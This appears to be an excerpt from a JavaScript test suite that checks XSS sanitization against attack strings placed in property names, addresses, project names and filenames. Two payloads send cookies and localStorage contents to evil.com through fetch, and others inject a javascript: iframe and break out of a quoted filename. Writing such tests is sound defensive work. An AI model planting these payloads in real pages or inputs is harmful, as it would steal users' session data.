...
describe('XSS Prevention - Comprehensive Sanitization', () => {
  ...
  describe('Real-world attack scenarios', () => {
    it('should prevent XSS in property name field', () => {
      const attack = '<img src=x onerror=fetch("https://evil.com/steal?cookie="+document.cookie)>Riverside Gardens'
    ...
    it('should prevent XSS in address field', () => {
      const attack = '123 Main St<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ...
    it('should prevent stored XSS attack chain', () => {
      ...
      const maliciousProjectName = '"><script>fetch("https://evil.com/steal?data="+JSON.stringify({cookies:document.cookie,localStorage:localStorage}))</script><span class="'
    ...
    it('should prevent DOM-based XSS via filename', () => {
      ...
      const maliciousFilename = 'invoice.pdf";alert(String.fromCharCode(88,83,83));"'
